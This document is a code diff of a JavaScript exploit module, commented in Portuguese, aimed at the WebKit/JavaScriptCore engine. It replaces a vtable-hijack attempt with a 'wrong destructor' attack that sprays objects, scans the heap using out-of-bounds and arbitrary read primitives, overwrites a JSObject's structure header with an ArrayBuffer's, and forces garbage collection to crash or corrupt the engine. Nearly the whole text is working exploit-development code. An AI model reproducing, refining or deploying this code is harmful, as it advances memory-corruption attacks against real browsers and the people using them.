@@ -1,4 +1,4 @@
-// js/script3/testArrayBufferVictimCrash.mjs (Revisão 54 - Sequestro de Vtable)
+// js/script3/testArrayBufferVictimCrash.mjs (Revisão 55 - Ataque de Destruidor Incorreto no Gigacage)
 
 import { logS3, PAUSE_S3 } from './s3_utils.mjs';
 import { AdvancedInt64, toHex, isAdvancedInt64Object } from '../utils.mjs';
@@ -8,80 +8,130 @@ import {
     arb_read,
     arb_write,
     oob_read_absolute,
-    oob_write_absolute,
     isOOBReady,
     oob_dataview_real
 } from '../core_exploit.mjs';
-import { JSC_OFFSETS, WEBKIT_LIBRARY_INFO } from '../config.mjs';
+import { JSC_OFFSETS, OOB_CONFIG } from '../config.mjs';
 
-// ... (Funções isValidPointer e read_cstring, se necessárias) ...
+function isValidPointer(ptr) {
+    if (!isAdvancedInt64Object(ptr)) return false;
+    const high = ptr.high();
+    if (high < 0x1000) return false;
+    if ((high & 0x7FF00000) === 0x7FF00000) return false;
+    return true;
+}
+
+async function read_cstring(address) {
+    let str = "";
+    for (let i = 0; i < 128; i++) {
+        const char_code = await arb_read(address, 1, i);
+        if (char_code === 0x00 || char_code > 127) break;
+        str += String.fromCharCode(char_code);
+    }
+    return str;
+}
+
+// ... (Estratégias antigas podem ser mantidas aqui) ...
 
 // ======================================================================================
-// ESTRATÉGIA ATUAL (R54) - SEQUESTRO DE VTABLE
+// ESTRATÉGIA ATUAL (R55) - ATAQUE DE DESTRUIDOR INCORRETO
 // ======================================================================================
-export const FNAME_MODULE_VTABLE_HIJACK_R54 = "VTableHijack_R54_CodeExec";
+export const FNAME_MODULE_DESTRUCTOR_HIJACK_R55 = "DestructorHijack_R55_Attack";
 
-export async function executeVtableHijack_R54() {
-    const FNAME = FNAME_MODULE_VTABLE_HIJACK_R54;
+let sprayed_objects_R55 = [];
+const SPRAY_COUNT_R55 = 5000;
+
+function spray_objects_R55() {
+    logS3(`[R55] Pulverizando ${SPRAY_COUNT_R55} objetos JS simples...`, 'debug');
+    for (let i = 0; i < SPRAY_COUNT_R55; i++) {
+        sprayed_objects_R55.push({ marker1: 0x41414141, marker2: i });
+    }
+}
+
+// Escaneador de heap genérico para encontrar um objeto pelo nome da classe
+async function find_object_address_by_class_R55(classNameToFind) {
+    logS3(`[R55] Procurando por um objeto do tipo '${classNameToFind}'...`, 'debug');
+    const CLASS_INFO_OFFSET = JSC_OFFSETS.Structure.CLASS_INFO_OFFSET;
+    const CLASS_INFO_CLASS_NAME_OFFSET = 0x8;
+
+    for (let i = 0; i < OOB_CONFIG.ALLOCATION_SIZE - 0x10; i += 8) {
+        try {
+            const p_struct = oob_read_absolute(i, 8);
+            if (!isValidPointer(p_struct)) continue;
+            
+            const p_class_info = await arb_read(p_struct, 8, CLASS_INFO_OFFSET);
+            if (!isValidPointer(p_class_info)) continue;
+            
+            const p_class_name = await arb_read(p_class_info, 8, CLASS_INFO_CLASS_NAME_OFFSET);
+            if (!isValidPointer(p_class_name)) continue;
+
+            const class_name = await read_cstring(p_class_name);
+            
+            if (class_name === classNameToFind) {
+                const object_address = oob_dataview_real.buffer_addr.add(i);
+                logS3(`[R55] Encontrou '${classNameToFind}' no offset 0x${i.toString(16)}. Addr: ${object_address.toString(true)}`, "leak");
+                return object_address;
+            }
+        } catch (e) { /* Ignora e continua */ }
+    }
+    return null;
+}
+
+export async function executeDestructorHijack_R55() {
+    const FNAME = FNAME_MODULE_DESTRUCTOR_HIJACK_R55;
     logS3(`--- Iniciando ${FNAME} ---`, "test");
     let result = { success: false, msg: "Teste não concluído", stage: "init" };
 
     try {
-        // --- Estágio 1: Setup ---
-        result.stage = "Setup";
+        // --- Estágio 1: Setup e Localização de Alvos ---
+        result.stage = "Find Targets";
         await triggerOOB_primitive({ force_reinit: true });
         if (!isOOBReady()) throw new Error("Falha na inicialização do ambiente OOB.");
-        const buffer_addr = oob_dataview_real.buffer_addr;
-        logS3(`[R54] Endereço do buffer OOB: ${buffer_addr.toString(true)}`, "info");
 
-        // --- Estágio 2: Criar a Estrutura Falsa ---
-        result.stage = "Build Fake Structure";
-        const FAKE_STRUCTURE_OFFSET = 0x2000;
-        const fake_structure_addr = buffer_addr.add(FAKE_STRUCTURE_OFFSET);
+        spray_objects_R55();
+        
+        const target_object_addr = await find_object_address_by_class_R55("Object");
+        if (!target_object_addr) {
+            throw new Error("Não foi possível encontrar um objeto alvo 'Object'. A Separação de Heap ainda é um problema.");
+        }
+        logS3(`[R55] Objeto alvo selecionado para corrupção: ${target_object_addr.toString(true)}`, "good");
 
-        // Um gadget útil para testar. Se funcionar, o exploit pode travar ou se comportar de forma estranha.
-        // Precisamos do endereço base do WebKit para calcular o endereço real do gadget.
-        // ESTA É A PARTE MAIS DIFÍCIL SEM UM LEAK PRÉVIO.
-        // Por enquanto, vamos usar um placeholder. Em um exploit real,
-        // o endereço base seria obtido primeiro.
-        const WEBKIT_BASE_PLACEHOLDER = new AdvancedInt64("0x800000000"); // Placeholder!
-        const GADGET_OFFSET = new AdvancedInt64(WEBKIT_LIBRARY_INFO.FUNCTION_OFFSETS["gadget_lea_rax_rdi_plus_20_ret"]);
-        const gadget_addr = WEBKIT_BASE_PLACEHOLDER.add(GADGET_OFFSET);
+        // --- Estágio 2: Obter um Header de ArrayBuffer Válido ---
+        result.stage = "Get AB Header";
+        const real_array_buffer = new ArrayBuffer(0x100);
+        sprayed_objects_R55.push(real_array_buffer); // Garante que não seja coletado pelo GC
+        
+        const real_ab_addr = await find_object_address_by_class_R55("ArrayBuffer");
+        if (!real_ab_addr) {
+            throw new Error("Não foi possível encontrar o ArrayBuffer de referência na memória.");
+        }
+        logS3(`[R55] Endereço do ArrayBuffer de referência: ${real_ab_addr.toString(true)}`, "good");
 
-        logS3(`[R54] Criando Structure falsa em ${fake_structure_addr.toString(true)}`, 'debug');
-        logS3(`[R54] Apontando Vtable[put] para o gadget em ${gadget_addr.toString(true)}`, 'vuln');
-        
-        // Escreve o ponteiro para o gadget no offset da função virtual 'put'.
-        oob_write_absolute(FAKE_STRUCTURE_OFFSET + JSC_OFFSETS.Structure.VIRTUAL_PUT_OFFSET, gadget_addr, 8);
-        
-        // --- Estágio 3: Corromper um Objeto Vítima ---
-        result.stage = "Corrupt Victim";
-        
-        // A condição do "Heisenbug" original.
-        const CRITICAL_WRITE_OFFSET = 0x7C;
-        const victim_object = { a: 1, b: 2 }; // Vítima
+        const array_buffer_header = await arb_read(real_ab_addr, 8, 0);
+        logS3(`[R55] Cabeçalho (Structure*) do ArrayBuffer de referência: ${array_buffer_header.toString(true)}`, "leak");
 
-        // Corrompemos um ponteiro de um objeto para apontar para nossa Estrutura falsa.
-        // A forma exata de fazer isso é a parte mais complexa e dependente da vulnerabilidade.
-        // Vamos simular a corrupção do cabeçalho do victim_object.
-        // Esta parte é teórica e exigiria uma primitiva de escrita mais precisa ou uma UAF.
+        // --- Estágio 3: Corrupção e Gatilho do GC ---
+        result.stage = "Corruption & Trigger";
+        logS3(`[R55] Sobrescrevendo o cabeçalho do JSObject alvo com o do ArrayBuffer...`, "vuln");
+        await arb_write(target_object_addr, array_buffer_header, 8, 0);
         
-        logS3(`[R54] AVISO: A corrupção precisa do cabeçalho do objeto é teórica e não implementada.`, "warn");
-        logS3(`[R54] Simulação: Se pudéssemos corromper o cabeçalho de victim_object para ${fake_structure_addr.toString(true)}, a próxima etapa funcionaria.`, "info");
-        
-        // --- Estágio 4: Acionar a Função Virtual ---
-        result.stage = "Trigger";
-        logS3(`[R54] Acionando a função virtual. Se o gadget for executado, o fluxo de controle será sequestrado.`, 'vuln_major');
-        
-        // Se a corrupção tivesse sucesso, esta linha chamaria o nosso gadget em vez de JSObject::put.
-        // victim_object.a = 0xDEADC0DE; 
+        logS3(`[R55] Corrupção realizada. Liberando referências para acionar o Garbage Collector...`, 'debug');
+        sprayed_objects_R55 = [];
 
-        throw new Error("A corrupção direta do cabeçalho não é implementável com as primitivas atuais. A estratégia falhou conceitualmente.");
+        logS3(`[R55] Forçando Garbage Collection. Se o navegador travar AGORA, o teste foi um SUCESSO.`, 'vuln_major');
+        let temp_allocs = [];
+        for (let i = 0; i < 200; i++) {
+            temp_allocs.push(new ArrayBuffer(100000));
+        }
+        
+        result.msg = "Corrupção concluída. O navegador não travou, o que indica que o GC não coletou o objeto ou a corrupção não foi fatal.";
+        logS3(`[R55] ${result.msg}`, 'warn');
 
     } catch (e) {
         result.msg = `Falha no estágio '${result.stage}': ${e.message}`;
         logS3(`[${FNAME}] ERRO: ${result.msg}`, "critical");
+        console.error(e);
     }
-    
+
     return result;
 }
